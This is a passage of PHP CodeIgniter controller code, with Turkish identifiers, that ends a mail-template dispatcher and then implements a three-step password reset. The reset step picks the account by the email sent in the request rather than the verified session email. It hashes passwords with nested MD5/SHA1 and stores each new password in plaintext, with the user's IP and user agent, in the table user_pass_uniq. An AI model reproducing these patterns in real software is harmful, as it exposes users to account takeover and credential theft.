                $cek=$this->m_tr_model->getTableSingle("table_users",array("id" => $user,"is_delete" => 0));
                $ilan=$this->m_tr_model->getTableSingle("table_adverts",array("id" => $order));
                $satici=$this->m_tr_model->getTableSingle("table_users",array("id" => $ilan->user_id));
                $viewdata->user=$cek;
                $viewdata->satici=$satici;
                $viewdata->ilan=$ilan;
                $viewdata->tt=1;
            }
            $this->load->view("mail_template/seller_new_message",$viewdata);
        }else if($tur==20){
            $this->load->model("m_tr_model");
            $viewdata=new stdClass();
            $this->load->helper("user_helper");
            if($user){
                $satici=$this->m_tr_model->getTableSingle("table_users",array("id" => $user));
                $viewdata->user=$satici;
                $viewdata->kod=$link;
            }
            $this->load->view("mail_template/change_password",$viewdata);
        }
    }


    public function userChangePass(){
        try {
            if($_POST){
                if($this->kontrolSession==$this->session->userdata("userUniqFormRegisterControl")) {
                    header('Content-Type: application/json');
                    if($this->input->post("email")){
                        if($this->input->post("type")==1){
                            $control=getTableSingle("table_users",array("email" => $this->input->post("email"),"is_delete" => 0,"banned" => 0,"status" => 1));
                            if($control){
                                $ayarlar=getTableSingle("options_general",array("id" => 1));
                                $tokens=tokengenerator(7,3);
                                $mailGonder = email_gonder($control->email, $ayarlar->site_name." - Şifre Güncelleme", "", "", 1, base_url("temp-mail/20/" . $tokens."/".$control->id));
                                if (!$mailGonder) {
                                    echo json_encode(array("hata" => "var","type" => "mail1"));
                                } else {
                                    $kaydet = $this->m_tr_model->updateTable("table_users", array("ch_pass_code" => $tokens, "ch_pass_date" => date("Y-m-d H:i:s")), array("id" => $control->id));
                                    if($kaydet){
                                        $_SESSION["chPass"]=$tokens;
                                        $_SESSION["chPassMail"]=$control->email;
                                        echo json_encode(array("hata" => "yok","step" => "mail"));
                                    }else{
                                        echo json_encode(array("hata" => "var","type" => "kayit"));
                                    }
                                }
                            }
                        }else if($this->input->post("type")==2){
                            if($_SESSION["chPass"] && $_SESSION["chPassMail"]){
                                if($this->input->post("kod") && strlen(trim($this->input->post("kod")))==7){
                                    if($this->input->post("kod")==$_SESSION["chPass"]){
                                        $_SESSION["chPassControl"]="evet";
                                        echo json_encode(array("hata" => "yok","step" =>"pass"));
                                    }else{
                                        $_SESSION["chPassControl"]="hayir";
                                        echo json_encode(array("hata" => "var","message" => langS(171,2) ,"step" => "mail"));
                                    }
                                }else{
                                    echo json_encode(array("hata" => "var","step" => "mail","message" => langS(171,2) ));
                                }
                            }
                        }else if($this->input->post("type")==3){
                            if($_SESSION["chPass"] && $_SESSION["chPassMail"] &&  $_SESSION["chPassControl"]=="evet"){
                                if(strlen(trim($this->input->post("pass")))>=8){
                                    if(trim($this->input->post("pass")) && trim($this->input->post("passtry"))){
                                        $control=getTableSingle("table_users",array("email" => $this->input->post("email"),"is_delete" => 0,"banned" => 0,"status" => 1));
                                        if($control){
                                            if($this->input->post("pass")==$this->input->post("passtry")){
                                                $guncelle=$this->m_tr_model->updateTable("table_users",array("password" => md5(sha1(md5($this->input->post("pass"))))),array("id" => $control->id));
                                                if($guncelle){
                                                    $ekle=$this->m_tr_model->add_new(array(
                                                        "user_id" => $control->id,
                                                        "pass" => $this->input->post("pass"),
                                                        "ip" => $_SERVER["REMOTE_ADDR"],
                                                        "agent" => $_SERVER["HTTP_USER_AGENT"],
                                                        "created_at" =>  date("Y-m-d H:i:s"),
                                                    ),"user_pass_uniq");
                                                    echo json_encode(array("hata" => "yok","step" =>"finish"));
                                                }else{
                                                    echo json_encode(array("hata" => "var","message" => langS(59,2) ));
                                                }
                                            }else{
                                                echo json_encode(array("hata" => "var","step" => "pass","message" => langS(15,2) ));
                                            }
                                        }else{
                                            echo json_encode(array("hata" => "var","step" => "pass","message" => langS(171,2) ));
                                        }
                                    }else{
                                        echo json_encode(array("hata" => "var","step" => "pass","message" => langS(171,2) ));
                                    }
                                }else{
                                    echo json_encode(array("hata" => "var","step" => "pass","message" => langS(558,2) ));
                                }
                            }
                        }

                    }else{
                        echo json_encode(array("hata" => "var",langS(171,2)));
                    }
                }else{
                    redirect(base_url(gg()."404"));
                }
            }
        }catch (Exception $ex) {
            addLog("Şifremi Unuttum", $this->input->post("email")." mail adresinde beklenmeyen bir hata meydana geldi.", 4);
        }
    }

}


